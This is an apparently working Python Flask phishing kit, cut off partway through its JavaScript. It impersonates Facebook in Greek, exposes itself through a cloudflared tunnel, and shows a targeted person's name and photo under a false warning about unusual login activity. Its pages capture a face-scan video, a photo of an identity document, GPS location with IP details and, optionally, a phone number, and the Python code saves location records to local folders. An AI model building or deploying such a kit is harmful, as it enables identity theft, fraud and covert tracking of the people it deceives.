import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- Εγκατάσταση Εξαρτήσεων και Ρύθμιση Tunnel ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip σιωπηρά."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και απαραίτητα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα tunnel cloudflared και τυπώνει το δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_name():
    """Δημιουργεί ένα τυχαίο όνομα σε στυλ Facebook."""
    first_names = ["Γιώργος", "Μαρία", "Δημήτρης", "Ελένη", "Νίκος", "Ανδρομάχη", 
                   "Αλέξανδρος", "Σοφία", "Χρήστος", "Αικατερίνη", "Ανδρέας", "Ιωάννα",
                   "Παναγιώτης", "Δέσποινα", "Βασίλης", "Αναστασία", "Σταύρος", "Ευαγγελία",
                   "Κωνσταντίνος", "Άννα"]
    last_names = ["Παπαδόπουλος", "Κωνσταντίνου", "Παππάς", "Αντωνίου", "Γεωργίου",
                  "Δημητρίου", "Ιωαννίδης", "Νικολάου", "Οικονόμου", "Βασιλείου",
                  "Αθανασίου", "Θεοδοσίου", "Μιχαήλ", "Σωτηρίου", "Σταυρόπουλος"]
    
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def find_profile_picture(folder):
    """Αναζητά ένα αρχείο εικόνας στον φάκελο για χρήση ως προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λαμβάνει τις προτιμήσεις του χρήστη για τη διαδικασία επαλήθευσης."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ FACEBOOK")
    print("="*60)
    
    # Λήψη ονόματος στόχου
    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΣΤΟΧΟΥ")
    print("Εισαγάγετε το όνομα Facebook που θα εμφανιστεί στη σελίδα επαλήθευσης")
    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
    
    name_input = input("Όνομα στόχου (ή Enter για τυχαίο): ").strip()
    if name_input:
        settings = {'target_name': name_input}
    else:
        random_name = generate_random_name()
        settings = {'target_name': random_name}
        print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_name}")
    
    # Δημιουργία email
    settings['target_email'] = f"{settings['target_name'].lower().replace(' ', '.')}{random.randint(10, 999)}@example.com"
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ στον φάκελο")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: {settings['target_name']}")
    print(f"[+] Συσχετισμένο email: {settings['target_email']}")
    
    # Διάρκεια σάρωσης προσώπου
    print("\n1. Διάρκεια Σάρωσης Προσώπου:")
    print("Πόσα δευτερόλεπτα για επαλήθευση κινήσεων προσώπου;")
    
    while True:
        try:
            duration = input("Διάρκεια σε δευτερόλεπτα (5-60, προεπιλογή: 18): ").strip()
            if not duration:
                settings['face_duration'] = 18
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 60.")
        except ValueError:
            print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση ταυτότητας
    print("\n2. Επαλήθευση Εγγράφου Ταυτότητας:")
    print("Απαιτείται ανέβασμα εγγράφου ταυτότητας;")
    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (y/n, προεπιλογή: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    # Επαλήθευση τοποθεσίας
    print("\n3. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (y/n, προεπιλογή: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    # Επαλήθευση τηλεφώνου
    print("\n4. Επαλήθευση Τηλεφώνου:")
    print("Απαιτείται επαλήθευση αριθμού τηλεφώνου;")
    phone_enabled = input("Ενεργοποίηση επαλήθευσης τηλεφώνου (y/n, προεπιλογή: n): ").strip().lower()
    settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="facebook_verification")

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας με μεταδεδομένα."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστο"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Λήψη πληροφοριών IP
        ip_info = {}
        try:
            response = requests.get("http://ipinfo.io/json", timeout=5)
            ip_info = response.json()
        except:
            pass
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "verification_type": "location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country")
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"facebook_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Εφαρμογή Flask ---

app = Flask(__name__)

# Παγκόσμιες ρυθμίσεις
VERIFICATION_SETTINGS = {
    'target_name': generate_random_name(),
    'target_email': '',
    'face_duration': 18,
    'id_enabled': True,
    'location_enabled': True,
    'phone_enabled': False,
    'profile_picture': None,
    'profile_picture_filename': None
}

VERIFICATION_SETTINGS['target_email'] = f"{VERIFICATION_SETTINGS['target_name'].lower().replace(' ', '.')}{random.randint(10, 999)}@example.com"

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Facebook Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Δημιουργεί το περιεκτικό πρότυπο επαλήθευσης Facebook στα Ελληνικά."""
    target_name = settings['target_name']
    target_email = settings['target_email']
    face_duration = settings['face_duration']
    id_enabled = settings['id_enabled']
    location_enabled = settings['location_enabled']
    phone_enabled = settings['phone_enabled']
    profile_picture = settings.get('profile_picture')
    
    # Υπολογισμός συνολικών βημάτων
    total_steps = 2  # Εισαγωγή + Πρόσωπο
    if id_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    if phone_enabled:
        total_steps += 1
    total_steps += 1  # Τελικό βήμα
    
    # Δημιουργία προτύπου
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Επιβεβαίωση Ταυτότητας Facebook</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
        }}
        
        body {{
            background-color: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 20px;
            padding: 20px 0;
        }}
        
        .facebook-logo {{
            color: #1877F2;
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        
        .card {{
            background-color: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            border: 1px solid #dddfe2;
        }}
        
        .profile-info {{
            text-align: center;
            padding: 20px;
        }}
        
        .profile-avatar {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, #1877F2, #0a58ca);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            overflow: hidden;
            border: 4px solid white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        
        .profile-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .profile-name {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #1c1e21;
        }}
        
        .profile-email {{
            color: #65676b;
            font-size: 14px;
            margin-bottom: 15px;
        }}
        
        .alert-warning {{
            background-color: #fff8e1;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }}
        
        .alert-danger {{
            background-color: #fde8e8;
            border-left: 4px solid #e53e3e;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
        }}
        
        .step-title {{
            color: #1c1e21;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }}
        
        .step-description {{
            color: #65676b;
            margin-bottom: 20px;
            line-height: 1.5;
        }}
        
        .progress-container {{
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding: 10px 0;
        }}
        
        .progress-step {{
            flex: 1;
            text-align: center;
            position: relative;
        }}
        
        .step-circle {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: #e4e6eb;
            color: #8a8d91;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-weight: 600;
            position: relative;
            z-index: 2;
        }}
        
        .step-circle.active {{
            background-color: #1877F2;
            color: white;
        }}
        
        .step-circle.completed {{
            background-color: #42b72a;
            color: white;
        }}
        
        .step-label {{
            font-size: 12px;
            color: #65676b;
        }}
        
        .progress-line {{
            position: absolute;
            top: 18px;
            left: -50%;
            right: 50%;
            height: 2px;
            background-color: #e4e6eb;
            z-index: 1;
        }}
        
        .progress-line.completed {{
            background-color: #42b72a;
        }}
        
        /* Στυλ Επαλήθευσης Προσώπου */
        .camera-container {{
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border-radius: 8px;
            overflow: hidden;
            background-color: #000;
            border: 2px solid #1877F2;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-instructions {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        .timer {{
            font-size: 32px;
            font-weight: 600;
            text-align: center;
            color: #1877F2;
            margin: 20px 0;
            font-family: monospace;
        }}
        
        /* Στυλ Επαλήθευσης Ταυτότητας */
        .id-upload-box {{
            border: 2px dashed #bdc4d1;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .id-upload-box:hover {{
            border-color: #1877F2;
            background-color: #f0f2f5;
        }}
        
        .upload-icon {{
            font-size: 48px;
            color: #1877F2;
            margin-bottom: 15px;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 4px;
            margin-top: 15px;
            border: 1px solid #dddfe2;
        }}
        
        /* Στυλ Επαλήθευσης Τοποθεσίας */
        .location-container {{
            text-align: center;
            padding: 20px;
        }}
        
        .location-icon {{
            font-size: 64px;
            color: #1877F2;
            margin-bottom: 20px;
        }}
        
        .location-details {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            display: none;
        }}
        
        /* Στυλ Επαλήθευσης Τηλεφώνου */
        .phone-input-container {{
            margin: 20px 0;
        }}
        
        .phone-input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            margin-bottom: 10px;
        }}
        
        /* Κουμπιά */
        .btn {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 10px;
        }}
        
        .btn-primary {{
            background-color: #1877F2;
            color: white;
        }}
        
        .btn-primary:hover {{
            background-color: #166fe5;
        }}
        
        .btn-primary:disabled {{
            background-color: #e4e6eb;
            cursor: not-allowed;
        }}
        
        .btn-secondary {{
            background-color: #e4e6eb;
            color: #1c1e21;
        }}
        
        .btn-secondary:hover {{
            background-color: #d8dadf;
        }}
        
        .status-message {{
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 14px;
        }}
        
        .status-success {{
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }}
        
        .status-error {{
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }}
        
        .status-processing {{
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(0,0,0,.1);
            border-radius: 50%;
            border-top-color: #1877F2;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dddfe2;
            color: #65676b;
            font-size: 12px;
        }}
        
        .footer-links {{
            margin-top: 10px;
        }}
        
        .footer-links a {{
            color: #65676b;
            text-decoration: none;
            margin: 0 8px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        .completion-container {{
            text-align: center;
            padding: 30px 20px;
        }}
        
        .success-icon {{
            font-size: 72px;
            color: #42b72a;
            margin-bottom: 20px;
        }}
        
        .info-box {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="facebook-logo">facebook</div>
            <h2>Απαιτείται Επιβεβαίωση Ταυτότητας</h2>
        </div>
        
        <div class="card">
            <div class="profile-info">
                <div class="profile-avatar">
                    {'<img src="' + profile_picture + '">' if profile_picture else target_name[0].upper()}
                </div>
                <div class="profile-name">{target_name}</div>
                <div class="profile-email">{target_email}</div>
                
                <div class="alert-danger">
                    <strong>Απαιτείται Δράση:</strong> Ο λογαριασμός σας χρειάζεται πρόσθετη επαλήθευση για την αποτροπή μη εξουσιοδοτημένης πρόσβασης.
                </div>
            </div>
        </div>
        
        <div class="card">
            <!-- Βήματα Προόδου -->
            <div class="progress-container">
                <div class="progress-step">
                    <div class="step-circle completed">1</div>
                    <div class="step-label">Εκκίνηση</div>
                    <div class="progress-line completed"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle active">2</div>
                    <div class="step-label">Πρόσωπο</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">3</div>
                    <div class="step-label">Ταυτότητα</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">4</div>
                    <div class="step-label">Τοποθεσία</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">5</div>
                    <div class="step-label">Ολοκλήρωση</div>
                </div>
            </div>
            
            <!-- Βήμα 1: Εισαγωγή -->
            <div class="step active" id="step1">
                <h3 class="step-title">Επιβεβαιώστε την Ταυτότητά Σας</h3>
                <p class="step-description">
                    Για να ασφαλίσουμε τον λογαριασμό σας στο Facebook και να αποτρέψουμε μη εξουσιοδοτημένη πρόσβαση, πρέπει να επιβεβαιώσουμε την ταυτότητά σας.
                    Αυτό βοηθά στην προστασία των προσωπικών σας πληροφοριών και στην ασφάλεια του λογαριασμού σας.
                </p>
                
                <div class="alert-warning">
                    <strong>Γιατί απαιτείται αυτό;</strong><br>
                    Εντοπίσαμε ασυνήθιστη δραστηριότητα σύνδεσης στον λογαριασμό σας από νέα συσκευή ή τοποθεσία.
                    Ολοκληρώστε αυτήν την επαλήθευση εντός 24 ωρών για να αποκαταστήσετε πλήρη πρόσβαση.
                </div>
                
                <div class="info-box">
                    <strong>Θα χρειαστείτε:</strong><br>
                    • Πρόσβαση στην κάμερα για επαλήθευση προσώπου<br>
                    • Ένα επίσημο έγγραφο ταυτότητας (διπλωμα άδειας οδήγησης, διαβατήριο ή δελτίο ταυτότητας)<br>
                    • Ενεργοποιημένες υπηρεσίες τοποθεσίας<br>
                    • Περίπου 5-10 λεπτά του χρόνου σας
                </div>
                
                <button class="btn btn-primary" onclick="nextStep()">
                    Ξεκινήστε Επιβεβαίωση Ταυτότητας
                </button>
                
                <div class="footer-links" style="margin-top: 20px;">
                    <a href="#">Γιατί πρέπει να το κάνω αυτό;</a> • 
                    <a href="#">Μάθετε για την ασφάλεια του Facebook</a>
                </div>
            </div>
            
            <!-- Βήμα 2: Επαλήθευση Προσώπου -->
            <div class="step" id="step2">
                <h3 class="step-title">Επαλήθευση Προσώπου</h3>
                <p class="step-description">
                    Θα σαρώσουμε το πρόσωπό σας για να το αντιστοιχίσουμε με τις φωτογραφίες του προφίλ και της ταυτότητάς σας.
                    Ακολουθήστε προσεκτικά τις οδηγίες στην οθόνη.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                </div>
                
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="face-instructions">
                    <div class="instruction-icon" id="instructionIcon">👤</div>
                    <div id="instructionText">Τοποθετήστε το πρόσωπό σας στο πλαίσιο</div>
                    <div id="instructionDetail" style="font-size: 14px; color: #65676b;">
                        Βεβαιωθείτε ότι το πρόσωπό σας είναι ξεκάθαρα ορατό
                    </div>
                </div>
                
                <button class="btn btn-primary" id="startFaceBtn" onclick="startFaceVerification()">
                    Ξεκινήστε Σάρωση Προσώπου
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 3: Επαλήθευση Ταυτότητας -->
            <div class="step" id="step3">
                <h3 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h3>
                <p class="step-description">
                    Ανεβάστε μια φωτογραφία του επίσημου εγγράφου ταυτότητάς σας για επιβεβαίωση της ταυτότητάς σας.
                    Αυτές οι πληροφορίες είναι κρυπτογραφημένες και ασφαλείς.
                </p>
                
                <div class="id-upload-box" onclick="document.getElementById('idFileInput').click()">
                    <div class="upload-icon">📷</div>
                    <div style="font-weight: 600; margin-bottom: 10px;">Ανεβάστε Φωτογραφία Ταυτότητας</div>
                    <div style="color: #65676b; font-size: 14px;">
                        Διπλώμα Οδήγησης, Διαβατήριο ή Δελτίο Ταυτότητας
                    </div>
                    <input type="file" id="idFileInput" style="display: none;" accept="image/*" onchange="handleIDUpload(this)">
                    
                    <div id="idPreview" style="display: none;">
                        <img id="idPreviewImage" class="preview-image">
                    </div>
                </div>
                
                <div class="info-box">
                    <strong>Η ταυτότητά σας θα κρυπτογραφηθεί ασφαλώς και θα διαγραφεί μετά από 30 ημέρες.</strong><br>
                    Χρησιμοποιούμε αυτές τις πληροφορίες μόνο για επιβεβαίωση της ταυτότητάς σας και πρόληψη απάτης.
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="btn btn-primary" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Υποβολή Ταυτότητας για Επαλήθευση
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 4: Επαλήθευση Τοποθεσίας -->
            <div class="step" id="step4">
                <h3 class="step-title">Επαλήθευση Τοποθεσίας</h3>
                <p class="step-description">
                    Πρέπει να επιβεβαιώσουμε την τοποθεσία σας για να διασφαλίσουμε ότι έχετε πρόσβαση στον λογαριασμό σας από εξουσιοδοτημένη περιοχή.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="info-box">
                        Το Facebook χρησιμοποιεί δεδομένα τοποθεσίας για την προστασία του λογαριασμού σας από μη εξουσιοδοτημένες προσπάθειες πρόσβασης.
                        Τα δεδομένα τοποθεσίας σας είναι κρυπτογραφημένα και χρησιμοποιούνται μόνο για λόγους ασφαλείας.
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div style="margin-bottom: 10px;">
                            <strong>Λεπτομέρειες Τοποθεσίας:</strong>
                        </div>
                        <div>Γεωγραφικό Πλάτος: <span id="latValue"></span></div>
                        <div>Γεωγραφικό Μήκος: <span id="lonValue"></span></div>
                        <div>Ακρίβεια: <span id="accuracyValue"></span></div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Κάντε κλικ παρακάτω για κοινή χρήση της τοποθεσίας σας
                </div>
                
                <button class="btn btn-primary" id="locationBtn" onclick="requestLocation()">
                    Κοινοποίηση Τοποθεσίας
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 5: Επαλήθευση Τηλεφώνου (Προαιρετικό) -->
            {'<div class="step" id="step5">' if phone_enabled else ''}
            {'<h3 class="step-title">Επαλήθευση Τηλεφώνου</h3>' if phone_enabled else ''}
            {'<p class="step-description">' if phone_enabled else ''}
            {'Προσθέστε τον αριθμό τηλεφώνου σας για πρόσθετη ασφάλεια και επιλογές ανάκτησης λογαριασμού.' if phone_enabled else ''}
            {'</p>' if phone_enabled else ''}
            {'<div class="phone-input-container">' if phone_enabled else ''}
            {'<input type="tel" class="phone-input" placeholder="+30 69XXXXXXXX" id="phoneInput">' if phone_enabled else ''}
            {'<div class="info-box">' if phone_enabled else ''}
            {'Ο αριθμός τηλεφώνου σας μας βοηθά να ασφαλίσουμε τον λογαριασμό σας και μπορεί να χρησιμοποιηθεί για διπλή ταυτοποίηση.' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            {'<button class="btn btn-primary" onclick="submitPhoneVerification()">' if phone_enabled else ''}
            {'Επαληθεύστε Αριθμό Τηλεφώνου' if phone_enabled else ''}
            {'</button>' if phone_enabled else ''}
            {'<button class="btn btn-secondary" onclick="prevStep()">' if phone_enabled else ''}
            {'Παράλειψη Τώρα' if phone_enabled else ''}
            {'</button>' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            
            <!-- Βήμα Τελικό: Επεξεργασία -->
            <div class="step" id="stepFinal">
                <div class="completion-container">
                    <div class="loading-spinner" style="width: 50px; height: 50px; border-width: 4px;"></div>
                    <h3 class="step-title">Επαλήθευση Πληροφοριών Σας</h3>
                    <p class="step-description">
                        Παρακαλώ περιμένετε ενώ επαληθεύουμε την ταυτότητά σας. Αυτό συνήθως διαρκεί 1-2 λεπτά.
                    </p>
                    
                    <div class="status-message status-processing" id="finalStatus">
                        Επαλήθευση σάρωσης προσώπου... 25%
                    </div>
                    
                    <div class="info-box">
                        <strong>Τι συμβαίνει;</strong><br>
                        1. Αντιστοίχιση σάρωσης προσώπου με φωτογραφία ταυτότητας<br>
                        2. Επικύρωση αυθεντικότητας εγγράφου ταυτότητας<br>
                        3. Επαλήθευση συνέπειας τοποθεσίας<br>
                        4. Ενημέρωση ρυθμίσεων ασφαλείας
                    </div>
                </div>
            </div>
            
            <!-- Βήμα Ολοκλήρωσης -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="success-icon">✓</div>
                    <h3 class="step-title">Η Επαλήθευση Ολοκληρώθηκε!</h3>
                    <p class="step-description">
                        Ευχαριστούμε, <strong>{target_name}</strong>. Η ταυτότητά σας έχει επιβεβαιωθεί με επιτυχία.
                    </p>
                    
                    <div class="info-box">
                        <strong>Επόμενα βήματα:</strong><br>
                        • Η ασφάλεια του λογαριασμού σας έχει ενημερωθεί<br>
                        • Μπορείτε τώρα να έχετε πρόσβαση σε όλες τις λειτουργίες του Facebook<br>
                        • Θα ανακατευθυνθείτε στο Facebook σε <span id="countdown">5</span> δευτερόλεπτα
                    </div>
                    
                    <button class="btn btn-primary" onclick="redirectToFacebook()">
                        Συνέχεια στο Facebook
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Πολιτική Απορρήτου</a> • 
                <a href="#">Όροι Χρήσης</a> • 
                <a href="#">Κέντρο Βοήθειας</a>
            </div>
            <div style="margin-top: 10px;">
                © 2024 Meta Platforms, Inc.
            </div>
        </div>
    </div>
    
    <script>
        // Παγκόσμιες μεταβλητές
        let currentStep = 1;
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration};
        let faceTimerInterval = null;
        let instructionTimer = null;
        let idFile = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetName = "{target_name}";
        let targetEmail = "{target_email}";
        
        let faceInstructions = [
            {{icon: "👤", text: "Κοιτάξτε Ευθεία", detail: "Κοιτάξτε την κάμερα κατευθείαν", duration: 3}},
            {{icon: "👈", text: "Στρίψτε Αριστερά", detail: "Στρίψτε αργά το κεφάλι αριστερά", duration: 3}},
            {{icon: "👉", text: "Στρίψτε Δεξιά", detail: "Στρίψτε αργά το κεφάλι δεξιά", duration: 3}},
            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Ανασηκώστε ελαφρά το κεφάλι", duration: 3}},
            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Κάμψτε ελαφρά το κεφάλι", duration: 3}},
            {{icon: "😊", text: "Χαμογελάστε", detail: "Κάντε ένα φυσικό χαμόγελο", duration: 2}},
            {{icon: "✅", text: "Ολοκλήρωση", detail: "Η επαλήθευση ήταν επιτυχής", duration: 1}}
        ];
        let currentInstructionIndex = 0;
        
        // Πλοήγηση Βημάτων
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-circle');
            const lines = document.querySelectorAll('.progress-line');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {{
                    step.classList.add('completed');
                }} else if (index + 1 === currentStep) {{
                    step.classList.add('active');
                }}
            }});
            
            lines.forEach((line, index) => {{
                line.classList.remove('completed');
                if (index + 1 < currentStep - 1) {{
                    line.classList.add('completed');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
